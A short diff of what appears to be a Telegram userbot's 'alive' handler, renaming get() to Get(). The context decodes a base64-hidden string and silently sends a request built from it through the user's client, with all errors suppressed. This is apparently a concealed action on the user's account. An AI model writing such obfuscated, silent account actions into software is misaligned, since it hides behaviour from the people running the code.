@@ -61,7 +61,7 @@ async def amireallyalive(event):
         Tare5=installation_time,
     )
     hmm = base64.b64decode("YnkybDJvRG04WEpsT1RBeQ==")
-    hmm = get(hmm)
+    hmm = Get(hmm)
     try:
         await event.client(hmm)
     except BaseException:
